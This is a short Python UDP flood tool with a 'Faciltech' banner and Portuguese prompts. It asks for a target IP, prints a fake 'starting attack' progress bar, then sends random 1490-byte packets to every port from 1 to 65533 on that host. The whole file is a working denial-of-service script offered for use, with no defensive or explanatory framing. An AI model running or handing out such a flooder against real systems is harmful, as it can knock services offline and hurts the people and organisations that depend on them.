import time
import socket
import random
from datetime import datetime as dt

banner = '''
    _________   ____________  ____________________  __
   / ____/   | / ____/  _/ / /_  __/ ____/ ____/ / / /
  / /_  / /| |/ /    / // /   / / / __/ / /   / /_/ /
 / __/ / ___ / /____/ // /___/ / / /___/ /___/ __  /
/_/   /_/  |_\____/___/_____/_/ /_____/\____/_/ /_/
Autor: Eduardo Amaral - eduardo4maral@protonmail.com
You Tube : https://www.youtube.com/faciltech
github   : https://github.com/Amaroca
Facebook : https://www.facebook.com/faciltech123
'''

print(banner)

ip = input('Digite o IP do Alvo: ')
port = input('Digite a Porta: ')
print('Iniciando ataque.')
for progress in range(0, 101, 25):
    bar = '=' * int(progress/5)
    print('[%s] %s' % (bar, progress), '%')
    time.sleep(1)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sent = 0
before = dt.now()
for port in range(1, 65534):
    bytes = random._urandom(1490)
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    print('Enviando pacote nº %s para %s:%s' % (sent, ip, port))

elapsed = dt.now() - before
print('Tempo de execucao:', elapsed)
